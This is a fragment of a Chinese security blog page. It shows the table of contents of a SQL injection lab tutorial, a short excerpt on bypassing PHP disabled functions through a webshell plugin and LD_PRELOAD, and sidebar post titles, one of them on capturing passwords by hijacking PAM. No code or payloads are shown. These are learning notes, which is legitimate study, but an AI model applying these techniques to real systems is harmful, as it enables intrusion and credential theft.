class="info-2"><div class="info-item-1">LD_PRELOAD 时间紧 于是先采用最省时的方法 先蚁剑连 发现打不开 flag 文件 要使用蚁剑插件绕过disabled function 如果蚁剑插件市场打不开的话可以去 github 搜 github 上有说明 按着他的安 连上之后在蚁剑主页面右键 webshell 使用该插件 按照步骤操作 成功后把 webshell 地址改为...</div></div></div></a></div></div><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/custom/avatar.webp" onerror='this.onerror=null,this.src="/img/avatar/404.jpg"' alt="avatar"></div><div class="author-info-name">s1rius</div><div class="author-info-description">欢迎来到天狼的个人空间<br>这里有网络安全和其他技术文章</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cns1rius"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=MjkxNjExNzQ3Mw==" target="_blank" title="QQ"><i class="fab fa-qq" style="color:#d0b9ff"></i></a><a class="social-icon" href="https://s1rius.space/img/custom/wechat.webp" target="_blank" title="微信"><i class="fab fa-weixin" style="color:#07c160"></i></a><a class="social-icon" href="https://github.com/cns1rius" target="_blank" title="Github"><i class="fab fa-github" style="color:#24292e"></i></a><a class="social-icon" href="https://space.bilibili.com/NDM0MTM1MDI2" target="_blank" title="bilibili"><i class="fab fa-bilibili" style="color:#00a1d6"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color:#f26522"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">剑未佩妥，出门已是江湖；<br>千帆过尽，归来仍是少年。<br><a href="/link/">欢迎留言/交换友链</a><br><a onclick="location.reload(!0)">如遇bug请单击此处修复</a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#get-%E4%BC%A0%E5%8F%82"><span class="toc-number">1.</span> <span class="toc-text">GET 传参</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E8%AE%B2%E7%90%86%E8%AE%BA"><span class="toc-number">1.1.</span> <span class="toc-text">先讲理论</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E5%8F%82"><span class="toc-number">1.1.1.</span> <span class="toc-text">传参</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%AD%A3%E7%A1%AE%E5%9B%9E%E6%98%BE%E7%BB%BF%E8%89%B2%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE%E7%9A%84%E5%88%97%E6%95%B0%E5%8D%B3%E6%9C%AC%E9%9D%B6%E5%9C%BA%E5%9B%9E%E6%98%BE%E7%9A%84%E8%A1%8C%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E5%93%AA%E5%87%A0%E5%88%97"><span class="toc-number">1.1.3.</span> <span class="toc-text">判断回显的数据是数据库中的哪几列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E5%BA%93%E5%90%8D"><span class="toc-number">1.1.4.</span> <span class="toc-text">查库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.5.</span> <span class="toc-text">查表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E5%88%97%E5%90%8D"><span class="toc-number">1.1.6.</span> <span class="toc-text">查列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.7.</span> <span class="toc-text">提取数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-number">1.1.8.</span> <span class="toc-text">limit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">1.2.</span> <span class="toc-text">实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E9%94%99%E5%9B%9E%E6%98%BE%E9%83%BD%E6%9C%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">正错回显都有</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%90%86%E8%AE%BA%E8%BF%9B%E9%98%B6"><span class="toc-number">1.3.</span> <span class="toc-text">理论进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#substr"><span class="toc-number">1.3.2.0.1.</span> <span class="toc-text">substr</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ascii"><span class="toc-number">1.3.2.0.2.</span> <span class="toc-text">ascii</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#left"><span class="toc-number">1.3.2.0.3.</span> <span class="toc-text">left</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2-like"><span class="toc-number">1.3.2.0.4.</span> <span class="toc-text">模糊查询 like</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#regexp"><span class="toc-number">1.3.2.0.5.</span> <span class="toc-text">regexp</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E8%BF%9B%E9%98%B6"><span class="toc-number">1.4.</span> <span class="toc-text">实操进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-%E6%97%A0%E6%AD%A3%E7%A1%AE%E5%9B%9E%E6%98%BE"><span class="toc-number">1.4.1.</span> <span class="toc-text">有报错回显 无正确回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E5%9B%9E%E6%98%BE%E5%92%8C%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE%E9%83%BD%E6%B2%A1%E6%9C%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">正确回显和报错回显都没有</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#post-%E4%BC%A0%E5%8F%82"><span class="toc-number">2.</span> <span class="toc-text">POST 传参</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E8%AE%B2%E7%90%86%E8%AE%BA-2"><span class="toc-number">2.1.</span> <span class="toc-text">先讲理论</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#post%E4%BC%A0%E5%8F%82"><span class="toc-number">2.1.1.</span> <span class="toc-text">post传参</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">注入语句</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-2"><span class="toc-number">2.2.</span> <span class="toc-text">实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E8%AF%AF%E5%9B%9E%E6%98%BE%E9%83%BD%E6%9C%89"><span class="toc-number">2.2.1.</span> <span class="toc-text">正误回显都有</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%A1%E6%AD%A3%E7%A1%AE%E5%9B%9E%E6%98%BE-%E6%9C%89%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE"><span class="toc-number">2.2.2.</span> <span class="toc-text">没正确回显 有报错回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E9%94%99%E5%9B%9E%E6%98%BE%E9%83%BD%E6%B2%A1%E6%9C%89"><span class="toc-number">2.2.3.</span> <span class="toc-text">正错回显都没有</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E5%90%84%E7%A7%8D%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">基于报错注入的各种传参方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E8%AE%B2%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">先讲报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">3.1.1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extactvalue"><span class="toc-number">3.1.2.</span> <span class="toc-text">extactvalue</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">传参方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#user-agent-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.1.</span> <span class="toc-text">user-agent 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#referer-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.2.</span> <span class="toc-text">referer 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.3.</span> <span class="toc-text">cookie 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64-%E5%8A%A0%E5%AF%86%E7%9A%84-cookie-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.4.</span> <span class="toc-text">base64 加密的 cookie 注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%9A%84get"><span class="toc-number">4.</span> <span class="toc-text">过滤注释的GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">6.</span> <span class="toc-text">过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-or-%E5%92%8C-and"><span class="toc-number">6.1.</span> <span class="toc-text">过滤 or 和 and</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8B%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.</span> <span class="toc-text">过滤下的报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#26"><span class="toc-number">6.2.1.</span> <span class="toc-text">26</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#27"><span class="toc-number">6.2.2.</span> <span class="toc-text">27</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8B%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.3.</span> <span class="toc-text">过滤下的时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#waf"><span class="toc-number">7.</span> <span class="toc-text">waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F%E6%B3%A8%E9%87%8A"><span class="toc-number">8.1.</span> <span class="toc-text">结束注释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6"><span class="toc-number">10.</span> <span class="toc-text">二次注入进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9C%80%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95%E6%89%8D%E8%83%BD%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">10.1.</span> <span class="toc-text">需成功登录才能二次注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">order by注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E6%AC%A1%E6%95%B0%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">限制次数的注入</span></a></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/cloudever/" title="Cloudever wp"><img src="https://s1rius.space/img/cover/e16f609572c5ccbc8662f09ee43aede0.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="Cloudever wp"></a><div class="content"><a class="title" href="/2025/04/cloudever/" title="Cloudever wp">Cloudever wp</a><time datetime="2025-04-16T16:00:00.000Z" title="发表于 2025-04-17 00:00:00">2025-04-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/pam%E5%8A%AB%E6%8C%81%E5%AF%86%E7%A0%81/" title=".so劫持PAM监听密码"><img src="https://s1rius.space/img/cover/66daa8b3c48a5.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt=".so劫持PAM监听密码"></a><div class="content"><a class="title" href="/2025/03/pam%E5%8A%AB%E6%8C%81%E5%AF%86%E7%A0%81/" title=".so劫持PAM监听密码">.so劫持PAM监听密码</a><time datetime="2025-03-10T16:00:00.000Z" title="发表于 2025-03-11 00:00:00">2025-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/htb-Cat/" title="htb-Cat"><img src="https://s1rius.space/img/cover/672110e9c9b55.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="htb-Cat"></a><div class="content"><a class="title" href="/2025/02/htb-Cat/" title="htb-Cat">htb-Cat</a><time datetime="2025-02-19T16:00:00.000Z" title="发表于 2025-02-20 00:00:00">2025-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/leetcode%20394/" title="力扣 394.字符串解码 特殊解"><img src="https://s1rius.space/img/cover/1aec7595d09c4920b1624ab3cc68a4bf.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="力扣 394.字符串解码 特殊解"></a><div class="content"><a class="title" href="/2025/02/leetcode%20394/" title="力扣 394.字符串解码 特殊解">力扣 394.字符串解码 特殊解</a><time datetime="2025-02-19T16:00:00.000Z" title="发表于 2025-02-20 00:00:00">2025-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/" title="vue gin合并部署(完美方案)"><img src="https://s1rius.space/img/cover/wallhaven-dpzww3.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="vue gin合并部署(完美方案)"></a><div class="content"><a class="title" href="/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/" title="vue gin合并部署(完美方案)">vue gin合并部署(完美方案)</a><time datetime="2024-12-25T16:00:00.000Z" title="发表于 2024-12-26 00:00:00">2024-12-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="footer-beautify"></div><div class="copyright">&copy;2021 - 2025 By s1rius</div><div class="framework-info"><span>框架</span> <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题</span> <a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="virtual-icp"><a href="https://icp.星.fun/id.php?keyword=20250503" target="_blank"><img src="https://icp.星.fun/logo.png" width="20" height="20" style="vertical-align:middle;margin-right:5px">团ICP备20250503号</a><span style="margin-left:20px"></span><a href="https://icp.bbb-lsy07.my/query.php?keyword=20030503" target="_blank">联bBb盟 icp备20030503</a><span style="margin-left:20px"></span><a href="https://icp.gov.moe/?keyword=20258106" target="_blank">萌ICP备20258106号</a><span style="margin-left:20px"></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight,500)"><i class="fas fa-arrow-down"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i> <span>数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:rmf.scrollToTop();"><i class="fa fa-arrow-up"></i></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>复制</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://bing.com/search?q=&quot;+window.getSelection().toString());window.location.reload();"><i class="iconfont icon-bing"></i><span>bing</span></a><a class="rightMenu-item" href="javascript:rmf.searchinThisPage();"><i class="fas fa-search"></i><span>站内搜索</span></a><a class="rightMenu-item" href="#post-comment" onclick="rmf.yinyong()"><i class="fa-solid fa-message"></i><span>引用文本评论</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>转到链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>粘贴</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fas fa-comment"></i><span>空降评论</span></a><a class="rightMenu-item" href="javascript:switchCommentBarrage()"><i class="iconfont icon-danmukaiqi"></i><span>开/关评论弹幕</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>复制本文地址</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>转到链接</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>保存图片</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>在新窗口打开</span></a><a class="rightMenu-item" href="javascript:rmf.click()"><i class="fa fa-arrows-alt"></i><span>全屏显示</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制图片链接</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:toRandomPost()"><i class="fa fa-paper-plane"></i><span>随便逛逛</span></a><a class="rightMenu-item" href="javascript:rmf.switchDarkMode();"><i class="fa fa-moon"></i><span>昼夜切换</span></a><a class="rightMenu-item" href="javascript:rmf.translate();"><i class="iconfont icon-a-yuyanfanti"></i><span>繁简转换</span></a><a class="rightMenu-item" href="javascript:pjax.loadUrl(&quot;/license/&quot;);"><i class="fa fa-info-circle"></i><span>版权声明</span></a><a class="rightMenu-item" href="javascript:toggleWinbox();"><i class="fas fa-cog"></i><span>博客设置</span></a><a class="rightMenu-item" href="javascript:fullScreen();"><i class="fas fa-expand"></i><span>进入全屏</span></a></div></div><div id="rightmenu-mask" onclick="RemoveRightMenu()"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.bili33.top/npm/js-heo@1.0.6/translate/tw_cn.js"></script><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/medium-zoom/1.0.6/medium-zoom.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js"></script><script src="https://cdn.bili33.top/npm/node-snackbar@latest/src/js/snackbar.min.js"></script><div class="js-pjax"><script>(()=>{const e=()=>{const e=document.querySelectorAll("#article-container .mermaid-wrap");if(0===e.length)return;const t=()=>(e=>{window.loadMermaid=!0;const t="dark"===document.documentElement.getAttribute("data-theme")?"dark":"default";e.forEach(((e,n)=>{const d=e.firstElementChild,a=`mermaid-${n}`,r=`%%{init:{ 'theme':'${t}'}}%%\n`+d.textContent,i=mermaid.render(a,r),m=e=>{d.insertAdjacentHTML("afterend",e)};"string"==typeof i?m(i):i.then((({svg:e})=>m(e)))}))})(e);btf.addGlobalFn("themeChange",t,"mermaid"),window.loadMermaid?t():btf.getScript("https://cdn.bili33.top/npm/mermaid/dist/mermaid.min.js").then(t)};btf.addGlobalFn("encrypt",e,"mermaid"),window.pjax?e():document.addEventListener("DOMContentLoaded",e)})()</script><script>(()=>{const o="shuoshuo"===GLOBAL_CONFIG_SITE.pageType,t=null,e=(e=document,n=location.pathname)=>{twikoo.init({el:e.querySelector("#twikoo-wrap"),envId:"https://twikoo.s1rius.space/",region:"",onCommentLoaded:()=>{btf.loadLightbox(document.querySelectorAll("#twikoo .tk-content img:not(.tk-owo-emotion)"))},...t,path:n}),"post"===GLOBAL_CONFIG_SITE.pageType&&(()=>{const o=document.getElementById("twikoo-count");o&&twikoo.getCommentsCount({envId:"https://twikoo.s1rius.space/",region:"",urls:[window.location.pathname],includeReply:!1}).then((t=>{o.textContent=t[0].count})).catch((o=>{console.error(o)}))})(),o&&(window.shuoshuoComment.destroyTwikoo=()=>{e.children.length&&(e.innerHTML="",e.classList.add("no-comment"))})},n=(o,t)=>{"object"==typeof twikoo?setTimeout((()=>e(o,t)),0):btf.getScript("https://cdn.bili33.top/npm/twikoo/dist/twikoo.all.min.js").then((()=>e(o,t)))};o?window.shuoshuoComment={loadComment:n}:btf.loadComment(document.getElementById("twikoo-wrap"),n)})()</script></div><script defer data-pjax src="/custom/welcome.js"></script><script defer data-pjax src="/custom/nav.js"></script><script async src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script async data-pjax src="/custom/rightmenu.js"></script><script defer src="https://cdn.bili33.top/npm/jquery@latest/dist/jquery.min.js"></script><div class="aplayer data-pjax aplayer-fixed no-destroy aplayer-withlist" data-id="7783506601" data-server="netease" data-type="playlist" data-fixed="true" data-mutex="true" data-mini="true" data-listfolded="true" data-preload="none" data-theme="var(--lyx-theme)" data-order="random" data-volume="0.5" style="z-index:514;font-family:var(--global-font),KyoukashoProL,-apple-system,IBM Plex Mono,monosapce,&quot"></div><script defer data-pjax src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><script defer data-pjax src="/custom/readPercent.js"></script><link rel="stylesheet" href="https://cdn.bili33.top/npm/aplayer@latest/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.bili33.top/npm/aplayer@latest/dist/APlayer.min.js"></script><script src="https://cdn.bili33.top/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>btf.addGlobalFn("pjaxSend",(()=>{if(window.aplayers)for(let a=0;a<window.aplayers.length;a++)window.aplayers[a].options.fixed||window.aplayers[a].destroy()}),"destroyAplayer"),btf.addGlobalFn("pjaxComplete",loadMeting,"runMetingJS")</script><script src="https://cdn.bili33.top/npm/pjax@latest/pjax.min.js"></script><script>(()=>{window.pjax=new Pjax({elements:'a:not([target="_blank"])',selectors:["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"],cacheBust:!1,analytics:!1,scrollRestoration:!1});const e=e=>{e&&Object.values(e).forEach((e=>e()))};document.addEventListener("pjax:send",(()=>{btf.removeGlobalFnEvent("pjaxSendOnce"),btf.removeGlobalFnEvent("themeChange");const t=document.body.classList;t.contains("read-mode")&&t.remove("read-mode"),e(window.globalFn.pjaxSend)})),document.addEventListener("pjax:complete",(()=>{btf.removeGlobalFnEvent("pjaxCompleteOnce"),document.querySelectorAll("script[data-pjax]").forEach((e=>{const t=document.createElement("script"),n=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(n)),e.parentNode.replaceChild(t,e)})),e(window.globalFn.pjaxComplete)})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))})()</script><script>(()=>{const t=!1,a=!1,e=!1,i="q7VGWkCYOir0FzMc6BH3jSZUTdxcJfkA",n=()=>{umami.track((t=>({...t,url:window.location.pathname+window.location.search+window.location.hash,title:GLOBAL_CONFIG_SITE.title})))},o=async t=>{const a=Date.now(),e=t?`&url=${window.location.pathname}`:"",n={Accept:"application/json"};n["x-umami-api-key"]=i;const o=await fetch(`https://api.umami.is/v1/websites/edb580f9-c557-47e7-b93d-dbd1c97d2c5e/stats?startAt=0000000000&endAt=${a}${e}`,{method:"GET",mode:"cors",cache:"default",headers:n});return await o.json()},c=async()=>{try{if("post"===GLOBAL_CONFIG_SITE.pageType&&e){const t=document.getElementById("umamiPV");if(t){const a=await o(!0);t.textContent=a.pageviews.value}}else{const e=(t||a)&&await o();if(t){const t=document.getElementById("umami-site-uv");t&&(t.textContent=e.visitors.value)}if(a){const t=document.getElementById("umami-site-pv");t&&(t.textContent=e.pageviews.value)}}}catch(t){console.error("Failed to load Umami Analytics:",t)}};btf.addGlobalFn("pjaxComplete",n,"umami_analytics_run_track"),btf.addGlobalFn("pjaxComplete",c,"umami_analytics_insert"),btf.getScript("https://cloud.umami.is/script.js",{"data-website-id":"edb580f9-c557-47e7-b93d-dbd1c97d2c5e","data-auto-track":"false"}).then(n),c()})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i> <span>数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div 